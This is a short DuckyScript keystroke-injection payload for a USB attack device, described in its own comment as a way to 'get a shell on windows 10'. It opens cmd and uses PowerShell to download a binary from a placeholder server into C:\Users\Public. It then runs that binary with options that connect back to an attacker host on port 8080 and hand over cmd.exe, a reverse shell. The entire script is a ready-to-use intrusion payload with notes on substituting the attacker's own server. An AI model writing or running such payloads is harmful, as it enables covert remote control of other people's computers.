DEFAULT_DELAY 500
REM Get a shell on windows 10
DELAY 3000
GUI r
DELAY 1000
STRING cmd
ENTER
STRING cd C:\\Users\Public
ENTER
REM Replace URL's with your server IP and upload dbd-stealth to the server
STRING powershell -command "& { iwr http://your-box.com/dbd -OutFile hi.exe }
DELAY 7500
ENTER
STRING hi.exe your-hack-box.com -p 8080 -e cmd.exe -c on -k secretsecret
